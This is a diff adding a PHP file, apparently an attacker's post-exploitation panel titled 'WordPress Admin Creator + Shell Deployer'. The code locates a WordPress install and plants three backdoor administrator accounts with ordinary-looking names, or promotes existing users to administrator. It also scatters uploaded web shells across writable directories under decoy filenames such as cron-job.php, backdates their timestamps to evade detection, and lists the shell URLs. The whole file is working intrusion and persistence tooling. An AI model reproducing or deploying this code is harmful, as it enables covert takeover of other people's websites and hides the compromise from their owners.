@@ -1,0 +1,693 @@
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+ini_set('display_errors', 0);
+error_reporting(0);
+
+// ============ WORDPRESS ADMIN AUTO-CREATE ============
+
+/**
+ * Generate natural sounding usernames
+ */
+function generateNaturalUsername($index = null) {
+    $firstNames = [
+        'budi', 'siti', 'agus', 'dewi', 'andi', 'rina', 'toni', 'nina',
+        'eko', 'sari', 'dian', 'rudi', 'ani', 'herman', 'tuti', 'yudi',
+        'nita', 'bambang', 'indra', 'mega', 'ferdi', 'lina', 'gilang',
+        'dina', 'joko', 'wati', 'reza', 'vina', 'aldo', 'santi',
+        'ryan', 'lisa', 'danu', 'fani', 'gilang', 'nadia', 'ivan',
+        'rina', 'robert', 'sarah', 'michael', 'jessica', 'william',
+        'emma', 'james', 'olivia', 'benjamin', 'charlotte', 'henry',
+        'amelia', 'daniel', 'mia', 'alexander', 'isabella', 'david'
+    ];
+    
+    $lastNames = [
+        'putra', 'permana', 'saputra', 'wijaya', 'kusuma', 'pradana',
+        'rahayu', 'wibowo', 'gunawan', 'susanto', 'pratama', 'mulyono',
+        'handoko', 'suharto', 'sanusi', 'hidayat', 'ramadhan', 'surya',
+        'purnama', 'kurniawan', 'utami', 'pangestu', 'mahendra', 'cahya',
+        'smith', 'johnson', 'williams', 'brown', 'jones', 'garcia',
+        'miller', 'davis', 'rodriguez', 'martinez', 'hernandez', 'lopez'
+    ];
+    
+    $prefixes = ['admin_', 'wp_', 'super_', 'root_', 'vip_', 'master_', ''];
+    
+    if ($index !== null) {
+        // For specific admin accounts with predictable names
+        $adminNames = [
+            ['username' => 'administrator', 'display' => 'Administrator'],
+            ['username' => 'admin', 'display' => 'Admin'],
+            ['username' => 'superadmin', 'display' => 'Super Admin']
+        ];
+        
+        if ($index < 3) {
+            return $adminNames[$index];
+        }
+    }
+    
+    // Random natural name
+    $firstName = $firstNames[array_rand($firstNames)];
+    $lastName = $lastNames[array_rand($lastNames)];
+    $prefix = $prefixes[array_rand($prefixes)];
+    
+    // Sometimes add numbers (60% chance)
+    if (rand(1, 100) <= 60) {
+        $suffix = rand(1, 999);
+        $username = $prefix . $firstName . $suffix;
+    } else {
+        $username = $prefix . $firstName . '_' . $lastName;
+    }
+    
+    // Make sure username is not too long
+    if (strlen($username) > 20) {
+        $username = substr($username, 0, 20);
+    }
+    
+    return [
+        'username' => $username,
+        'display' => ucfirst($firstName) . ' ' . ucfirst($lastName)
+    ];
+}
+
+/**
+ * Detect WordPress installation and create admin users
+ */
+function createWordPressAdmins() {
+    $wpConfigPath = findWpConfig();
+    if (!$wpConfigPath) {
+        return ['success' => false, 'message' => 'WordPress not found'];
+    }
+    
+    // Load WordPress
+    define('WP_USE_THEMES', false);
+    $wpRoot = dirname($wpConfigPath);
+    
+    try {
+        require_once($wpRoot . '/wp-load.php');
+        require_once($wpRoot . '/wp-includes/registration.php');
+        require_once($wpRoot . '/wp-admin/includes/user.php');
+    } catch (Exception $e) {
+        return ['success' => false, 'message' => 'Failed to load WordPress: ' . $e->getMessage()];
+    }
+    
+    $created = [];
+    $errors = [];
+    
+    // Define 3 admin accounts with natural names
+    $adminAccounts = [
+        [
+            'username' => 'budi_saputra',
+            'password' => generateRandomPassword(),
+            'email' => 'budi.saputra@' . generateRandomDomain(),
+            'display' => 'Budi Saputra'
+        ],
+        [
+            'username' => 'siti_rahayu',
+            'password' => generateRandomPassword(),
+            'email' => 'siti.rahayu@' . generateRandomDomain(),
+            'display' => 'Siti Rahayu'
+        ],
+        [
+            'username' => 'agus_putra',
+            'password' => generateRandomPassword(),
+            'email' => 'agus.putra@' . generateRandomDomain(),
+            'display' => 'Agus Putra'
+        ]
+    ];
+    
+    // Try to create each admin
+    foreach ($adminAccounts as $account) {
+        $username = $account['username'];
+        $password = $account['password'];
+        $email = $account['email'];
+        $display = $account['display'];
+        
+        // Check if user exists
+        $existing_user = get_user_by('login', $username);
+        
+        if ($existing_user) {
+            // Upgrade existing user to admin
+            $existing_user->set_role('administrator');
+            $created[] = [
+                'username' => $username,
+                'password' => 'EXISTING_USER (KEEP CURRENT PASSWORD)',
+                'email' => $existing_user->user_email,
+                'user_id' => $existing_user->ID,
+                'display' => $display,
+                'status' => 'upgraded_to_admin'
+            ];
+            continue;
+        }
+        
+        // Check if email exists
+        $existing_email = get_user_by('email', $email);
+        if ($existing_email) {
+            // Upgrade existing user to admin
+            $existing_email->set_role('administrator');
+            $created[] = [
+                'username' => $existing_email->user_login,
+                'password' => 'EXISTING_USER (KEEP CURRENT PASSWORD)',
+                'email' => $existing_email->user_email,
+                'user_id' => $existing_email->ID,
+                'display' => $display,
+                'status' => 'upgraded_to_admin_by_email'
+            ];
+            continue;
+        }
+        
+        // Create new user
+        $user_id = wp_create_user($username, $password, $email);
+        
+        if (!is_wp_error($user_id)) {
+            // Set display name
+            wp_update_user([
+                'ID' => $user_id,
+                'display_name' => $display,
+                'first_name' => explode(' ', $display)[0] ?? $username,
+                'last_name' => explode(' ', $display)[1] ?? ''
+            ]);
+            
+            // Assign administrator role
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+            
+            $created[] = [
+                'username' => $username,
+                'password' => $password,
+                'email' => $email,
+                'user_id' => $user_id,
+                'display' => $display,
+                'status' => 'new_user'
+            ];
+        } else {
+            $errors[] = $user_id->get_error_message();
+        }
+    }
+    
+    return [
+        'success' => count($created) > 0,
+        'created' => $created,
+        'errors' => $errors,
+        'wp_root' => $wpRoot,
+        'wp_config' => $wpConfigPath,
+        'admin_url' => rtrim($wpRoot, '/') . '/wp-admin'
+    ];
+}
+
+/**
+ * Find wp-config.php
+ */
+function findWpConfig() {
+    $paths = [
+        __DIR__ . '/wp-config.php',
+        dirname(__DIR__) . '/wp-config.php',
+        __DIR__ . '/../wp-config.php',
+        __DIR__ . '/../../wp-config.php',
+        __DIR__ . '/../../../wp-config.php',
+        __DIR__ . '/../../../../wp-config.php',
+        __DIR__ . '/../../../../../wp-config.php',
+    ];
+    
+    foreach ($paths as $path) {
+        if (file_exists($path)) {
+            return $path;
+        }
+    }
+    
+    // Scan deeper
+    $items = @scandir(__DIR__);
+    if ($items) {
+        foreach ($items as $item) {
+            if ($item !== '.' && $item !== '..' && is_dir($item)) {
+                $wpPath = __DIR__ . '/' . $item . '/wp-config.php';
+                if (file_exists($wpPath)) {
+                    return $wpPath;
+                }
+            }
+        }
+    }
+    
+    // Try common WordPress paths
+    $commonPaths = [
+        'wp',
+        'wordpress',
+        'blog',
+        'site',
+        'cms',
+        'public_html',
+        'html',
+        'www'
+    ];
+    
+    foreach ($commonPaths as $path) {
+        $wpPath = __DIR__ . '/' . $path . '/wp-config.php';
+        if (file_exists($wpPath)) {
+            return $wpPath;
+        }
+    }
+    
+    return false;
+}
+
+/**
+ * Generate random password (16-20 chars)
+ */
+function generateRandomPassword() {
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
+    $password = '';
+    
+    for ($i = 0; $i < rand(16, 20); $i++) {
+        $password .= $chars[rand(0, strlen($chars) - 1)];
+    }
+    
+    return $password;
+}
+
+/**
+ * Generate random domain for email
+ */
+function generateRandomDomain() {
+    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'mail.com', 
+                'yandex.com', 'icloud.com', 'zoho.com', 'aol.com', 'gmx.com'];
+    return $domains[array_rand($domains)];
+}
+
+// ============ ORIGINAL SHELL DEPLOYER ============
+
+/**
+ * Scan folder writable hingga kedalaman tertentu
+ */
+function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
+    $result = [];
+
+    if ($currentDepth > $maxDepth) return $result;
+    $items = @scandir($baseDir);
+    if (!$items) return $result;
+
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+
+        $fullPath = rtrim($baseDir, '/') . '/' . $item;
+        if (is_dir($fullPath)) {
+            if (is_writable($fullPath)) {
+                $result[] = $fullPath;
+            }
+            $result = array_merge(
+                $result,
+                scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1)
+            );
+        }
+    }
+
+    return $result;
+}
+
+/**
+ * Stock nama file yang banyak biar bisa milih dan bergantian
+ */
+function getStockFilenames() {
+    return [
+        'notes.php',
+        'data-info.php', 
+        'extra-file.php',
+        'sample-page.php',
+        'draft-note.php',
+        'temp-data.php',
+        'manual-page.php',
+        'archive-note.php',
+        'backup-data.php',
+        'config-setting.php',
+        'system-info.php',
+        'error-log.php',
+        'debug-mode.php',
+        'temp-file.php',
+        'cache-data.php',
+        'session-info.php',
+        'user-data.php',
+        'admin-page.php',
+        'login-check.php',
+        'auth-system.php',
+        'api-endpoint.php',
+        'webhook-listener.php',
+        'cron-job.php',
+        'task-runner.php',
+        'mailer.php',
+        'smtp-test.php',
+        'db-connect.php',
+        'sql-query.php',
+        'file-manager.php',
+        'image-upload.php',
+        'index-backup.php',
+        'wp-config-sample.php',
+        'xmlrpc-test.php',
+        'json-api.php',
+        'soap-client.php',
+        'rest-api.php',
+        'graphql-endpoint.php'
+    ];
+}
+
+// Handle WP Admin creation
+$wpResult = null;
+if (isset($_POST['create_wp_admins'])) {
+    $wpResult = createWordPressAdmins();
+}
+
+// Handle shell deploy
+if (isset($_FILES['files'])) {
+    // Will process later
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>WordPress Admin Creator + Shell Deployer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        :root {
+            --primary: #00ff00;
+            --background: #000000;
+            --surface: #111111;
+            --text: #00ff00;
+            --success: #00ff00;
+            --error: #ff0000;
+            --warning: #ffff00;
+            --border: #333333;
+        }
+        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
+        body { margin: 0; padding: 20px; background-color: var(--background); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background-color: var(--surface); border: 2px solid var(--primary); border-radius: 0px; padding: 30px; width: 100%; max-width: 950px; box-shadow: 0 0 20px var(--primary); }
+        h1 { text-align: center; color: var(--primary); font-weight: bold; margin-bottom: 10px; text-transform: uppercase; border-bottom: 2px solid var(--primary); padding-bottom: 15px; }
+        h2 { color: var(--warning); font-size: 16px; margin: 20px 0 15px 0; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        label { display: block; margin-bottom: 10px; font-size: 14px; color: #00ff00; }
+        input[type="file"] { width: 100%; background-color: #000000; color: var(--text); border: 2px dashed var(--primary); border-radius: 0px; padding: 15px; margin-bottom: 20px; font-size: 14px; cursor: pointer; }
+        button { width: 100%; background: #000000; color: var(--primary); font-weight: bold; border: 2px solid var(--primary); border-radius: 0px; padding: 15px; cursor: pointer; font-size: 16px; transition: all 0.2s ease; text-transform: uppercase; }
+        button:hover { background: var(--primary); color: #000000; }
+        .btn-wp { border-color: var(--warning); color: var(--warning); }
+        .btn-wp:hover { background: var(--warning); color: #000; }
+        .btn-deploy { border-color: var(--primary); color: var(--primary); }
+        .btn-deploy:hover { background: var(--primary); color: #000; }
+        .message { margin-top: 25px; padding: 15px; border-radius: 0px; font-size: 14px; line-height: 1.5; border: 1px solid; }
+        .success { background-color: rgba(0, 255, 0, 0.1); color: var(--success); border-color: var(--success); }
+        .error { background-color: rgba(255, 0, 0, 0.1); color: var(--error); border-color: var(--error); }
+        .warning { background-color: rgba(255, 255, 0, 0.1); color: var(--warning); border-color: var(--warning); }
+        code { font-family: 'Courier New', monospace; font-size: 12px; color: #00ff00; }
+        ul { margin: 10px 0 0 0; padding: 0; list-style: none; }
+        li { padding: 8px 0; border-bottom: 1px solid #333; }
+        li:last-child { border-bottom: none; }
+        a { color: #00ffff; text-decoration: none; }
+        a:hover { text-decoration: underline; color: #ffffff; }
+        .url-box { background: #000; border: 1px solid #333; padding: 10px; margin: 5px 0; word-break: break-all; }
+        .file-info { color: #00aa00; font-size: 11px; margin-left: 10px; }
+        .terminal { background: #000; border: 1px solid #00ff00; padding: 15px; margin-top: 20px; font-family: monospace; font-size: 12px; }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .stock-info { color: #00ffff; font-size: 11px; margin-top: 5px; }
+        .creds-box { background: #000; border: 1px solid #333; padding: 15px; margin: 10px 0; }
+        .creds-box .user { color: #0ff; }
+        .creds-box .pass { color: #ff0; }
+        .creds-box .email { color: #f0f; }
+        .creds-box .status { color: #0f0; font-size: 11px; }
+        .section-divider { border-top: 2px solid #333; margin: 30px 0; }
+        .btn-sm { width: auto; padding: 8px 20px; font-size: 12px; display: inline-block; margin: 5px; }
+        .btn-group { text-align: center; margin: 10px 0; }
+        .badge { display: inline-block; padding: 2px 8px; background: #333; color: #fff; font-size: 10px; }
+        .badge-new { background: #0f0; color: #000; }
+        .badge-upgrade { background: #ff0; color: #000; }
+        .wp-admin-link { color: #0ff; font-size: 12px; margin-left: 10px; }
+        .admin-card { background: #000; border: 1px solid #333; padding: 12px; margin: 8px 0; }
+        .admin-card strong { color: #0ff; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>⚡ WORDPRESS ADMIN CREATOR ⚡</h1>
+    <div style="text-align:center;color:#666;font-size:12px;margin-bottom:20px;">
+        Automatically create 3 WordPress Admin accounts + Deploy Shells
+    </div>
+
+    <!-- WordPress Admin Creator -->
+    <h2>🔐 CREATE WORDPRESS ADMIN ACCOUNTS</h2>
+    <div style="background:#000;padding:15px;border:1px solid #333;margin-bottom:15px;">
+        <div style="color:#0f0;font-size:12px;">
+            📌 Will create 3 admin accounts:<br>
+            • <strong>budi_saputra</strong> (Budi Saputra)<br>
+            • <strong>siti_rahayu</strong> (Siti Rahayu)<br>
+            • <strong>agus_putra</strong> (Agus Putra)<br>
+            <span style="color:#666;font-size:10px;">* If accounts already exist, they will be upgraded to Administrator</span>
+        </div>
+    </div>
+    
+    <form method="post">
+        <button type="submit" name="create_wp_admins" class="btn-wp">👤 CREATE WP ADMIN ACCOUNTS</button>
+    </form>
+
+    <?php if ($wpResult): ?>
+        <div class="message <?php echo $wpResult['success'] ? 'success' : 'error'; ?>">
+            <?php if ($wpResult['success']): ?>
+                <strong>✅ WORDPRESS ADMIN ACCOUNTS CREATED/UPGRADED!</strong>
+                <br><br>
+                <strong>📁 WordPress Root:</strong> <?php echo htmlspecialchars($wpResult['wp_root']); ?>
+                <br>
+                <strong>🔗 Admin URL:</strong> <a href="<?php echo $wpResult['admin_url']; ?>" target="_blank"><?php echo $wpResult['admin_url']; ?></a>
+                
+                <ul>
+                <?php foreach ($wpResult['created'] as $account): ?>
+                    <li>
+                        <div class="admin-card">
+                            <strong>👤 <?php echo htmlspecialchars($account['display'] ?? $account['username']); ?></strong>
+                            <br>
+                            <span class="user">Username: <?php echo htmlspecialchars($account['username']); ?></span>
+                            <br>
+                            <?php if ($account['password'] !== 'EXISTING_USER (KEEP CURRENT PASSWORD)'): ?>
+                                <span class="pass">Password: <?php echo htmlspecialchars($account['password']); ?></span>
+                            <?php else: ?>
+                                <span class="warning">⚠️ User already exists - Password unchanged</span>
+                            <?php endif; ?>
+                            <br>
+                            <span class="email">Email: <?php echo htmlspecialchars($account['email']); ?></span>
+                            <br>
+                            <?php if (isset($account['status'])): ?>
+                                <span class="status">
+                                    <?php if ($account['status'] === 'new_user'): ?>
+                                        <span class="badge badge-new">NEW</span> Created as new user
+                                    <?php else: ?>
+                                        <span class="badge badge-upgrade">UPGRADED</span> Existing user upgraded to Admin
+                                    <?php endif; ?>
+                                </span>
+                            <?php endif; ?>
+                            <?php if (isset($wpResult['admin_url'])): ?>
+                                <br>
+                                <a href="<?php echo $wpResult['admin_url']; ?>" target="_blank" class="wp-admin-link">🔗 Login to WP Admin</a>
+                            <?php endif; ?>
+                        </div>
+                    </li>
+                <?php endforeach; ?>
+                </ul>
+            <?php else: ?>
+                <strong>❌ FAILED:</strong> <?php echo htmlspecialchars($wpResult['message']); ?>
+                <br><br>
+                <span style="color:#ff0;">💡 WordPress not found in current directory or parent directories.</span>
+                <br>
+                <span style="color:#666;font-size:12px;">Make sure this script is in or near your WordPress installation.</span>
+            <?php endif; ?>
+        </div>
+    <?php endif; ?>
+
+    <div class="section-divider"></div>
+
+    <!-- Shell Deployer -->
+    <h2>🚀 SHELL DEPLOYER</h2>
+    <div class="stock-info">📁 Stock names: <?php echo implode(', ', array_slice(getStockFilenames(), 0, 8)); ?> ... dan <?php echo count(getStockFilenames()) - 8; ?> lainnya</div>
+    
+    <form method="post" enctype="multipart/form-data">  
+        <label for="files">UPLOAD SHELL (Max 3 files, tiap file dapat 3 copy dengan nama random dari stock):</label>
+        <input type="file" name="files[]" id="files" multiple required>
+        <button type="submit" class="btn-deploy">🚀 DEPLOY SHELL NOW</button>
+    </form>
+
+<?php
+if (isset($_FILES['files'])) {
+    echo '<div class="terminal">';
+    echo '$ <span class="blink">▋</span> Scanning writable directories...<br>';
+    
+    $files = $_FILES['files'];
+    $totalFiles = min(count($files['name']), 3);
+    
+    $stockFilenames = getStockFilenames();
+    $allWritable = scanWritableDirs(__DIR__, 6);
+    
+    if (empty($allWritable)) {
+        echo '<span style="color:#ff0000">✗ No writable directories found</span><br>';
+        echo '</div>';
+        echo "<div class='message error'>ERROR: Tidak ditemukan folder writable.</div>";
+    } else {
+        shuffle($allWritable);
+        $successCount = 0;
+        $uploadedURLs = [];
+        
+        echo '$ <span class="blink">▋</span> Found ' . count($allWritable) . ' writable directories<br>';
+        echo '$ <span class="blink">▋</span> Processing ' . $totalFiles . ' shell files (masing-masing 3 copy)...<br>';
+        
+        for ($i = 0; $i < $totalFiles; $i++) {
+            if ($files['error'][$i] !== UPLOAD_ERR_OK) continue;
+            
+            $tmp_name = $files['tmp_name'][$i];
+            $originalContent = @file_get_contents($tmp_name);
+            
+            if ($originalContent === false) continue;
+            
+            echo '$ <span class="blink">▋</span> Deploying: ' . htmlspecialchars($files['name'][$i]) . '<br>';
+            
+            // 3 copy untuk setiap shell
+            for ($copy = 1; $copy <= 3; $copy++) {
+                if (empty($allWritable)) break;
+                
+                // Get random folder
+                $randomKey = array_rand($allWritable);
+                $folder = $allWritable[$randomKey];
+                unset($allWritable[$randomKey]);
+                
+                $randomDateTime = date('Y-m-d H:i', strtotime('-' . rand(0, 90) . ' days'));
+                $timestamp = strtotime($randomDateTime);
+                
+                // Pilih nama random dari stock (bebas milih)
+                $randomName = $stockFilenames[array_rand($stockFilenames)];
+                $target = $folder . DIRECTORY_SEPARATOR . $randomName;
+                
+                // KEEP ORIGINAL SHELL CONTENT
+                $modifiedContent = $originalContent;
+                
+                // Save shell file
+                if (@file_put_contents($target, $modifiedContent) !== false) {
+                    @touch($target, $timestamp, $timestamp);
+                    @chmod($target, 0644);
+                    
+                    // Generate URL
+                    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
+                    $folderPath = realpath($folder);
+                    
+                    if (strpos($folderPath, $docRoot) === 0) {
+                        $relativePath = substr($folderPath, strlen($docRoot));
+                    } else {
+                        $relativePath = str_replace($docRoot, '', $folderPath);
+                    }
+                    
+                    $relativePath = str_replace('\\', '/', $relativePath);
+                    $relativePath = trim($relativePath, '/');
+                    
+                    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+                    $host = $_SERVER['HTTP_HOST'];
+                    
+                    $url = $protocol . '://' . $host . '/' . $relativePath . '/' . $randomName;
+                    $url = preg_replace('/([^:])\/\//', '$1/', $url);
+                    
+                    $successCount++;
+                    $uploadedURLs[] = [
+                        'url' => $url,
+                        'filename' => $randomName,
+                        'original' => $files['name'][$i],
+                        'folder' => $folder
+                    ];
+                    
+                    echo '  ✓ Copy ' . $copy . ': ' . $randomName . '<br>';
+                }
+            }
+        }
+        
+        echo '$ <span class="blink">▋</span> Deployment complete!<br>';
+        echo '</div>';
+        
+        if ($successCount > 0) {
+            $totalUploaded = $totalFiles;
+            
+            echo "<div class='message success'>";
+            echo "<strong>✅ SUCCESS: {$totalUploaded} shell(s) × 3 copies = {$successCount} total files</strong><br><br>";
+            
+            echo "<ul>";
+            foreach ($uploadedURLs as $index => $fileData) {
+                $number = $index + 1;
+                echo "<li>";
+                echo "<div class='url-box'>";
+                echo "<strong>[{$number}]</strong> <a href=\"{$fileData['url']}\" target=\"_blank\">{$fileData['url']}</a>";
+                echo "<div class='file-info'>";
+                echo "Original: {$fileData['original']} → Deployed as: <strong style='color:#ffff00'>{$fileData['filename']}</strong>";
+                echo "</div>";
+                echo "</div>";
+                echo "</li>";
+            }
+            echo "</ul>";
+            
+            // One-click access
+            echo "<br><div class='btn-group'>";
+            echo "<button onclick='openAllShells()' class='btn-sm' style='background:#000;color:#0f0;'>🖥️ OPEN ALL SHELLS</button> ";
+            echo "<button onclick='copyAllURLs()' class='btn-sm' style='background:#000;color:#0ff;'>📋 COPY ALL URLS</button>";
+            echo "</div>";
+            
+            echo "</div>";
+            
+            // JavaScript
+            echo "<script>
+            function openAllShells() {
+                " . implode("\n", array_map(function($file) {
+                    return "window.open('{$file['url']}', '_blank');";
+                }, $uploadedURLs)) . "
+            }
+            
+            function copyAllURLs() {
+                const urls = `" . implode("\n", array_map(function($file) {
+                    return $file['url'];
+                }, $uploadedURLs)) . "`;
+                navigator.clipboard.writeText(urls).then(() => {
+                    alert('All shell URLs copied to clipboard!');
+                });
+            }
+            </script>";
+        } else {
+            echo "<div class='message error'>✗ ERROR: Failed to deploy shells to any directory.</div>";
+        }
+    }
+}
+?>
+
+<div style="margin-top:20px;padding-top:15px;border-top:1px solid #333;font-size:10px;color:#666;text-align:center;">
+    ⚡ Shell Deployer v2.0 with WordPress Admin Creator<br>
+    <span class="blink">▋</span> All functions work independently
+</div>
+</div>
+
+<script>
+// File selection limit
+document.getElementById('files').addEventListener('change', function(e) {
+    if (this.files.length > 3) {
+        alert('Maximum 3 shell files allowed. Only first 3 will be deployed.');
+        const dataTransfer = new DataTransfer();
+        for (let i = 0; i < Math.min(3, this.files.length); i++) {
+            dataTransfer.items.add(this.files[i]);
+        }
+        this.files = dataTransfer.files;
+    }
+});
+
+// Drag and drop styling
+const fileInput = document.getElementById('files');
+fileInput.addEventListener('dragover', (e) => {
+    e.preventDefault();
+    fileInput.style.borderColor = '#00ffff';
+    fileInput.style.background = 'rgba(0, 255, 255, 0.1)';
+});
+
+fileInput.addEventListener('dragleave', () => {
+    fileInput.style.borderColor = '#00ff00';
+    fileInput.style.background = '#000000';
+});
+
+fileInput.addEventListener('drop', (e) => {
+    e.preventDefault();
+    fileInput.style.borderColor = '#00ff00';
+    fileInput.style.background = '#000000';
+});
+</script>
+</body>
+</html>
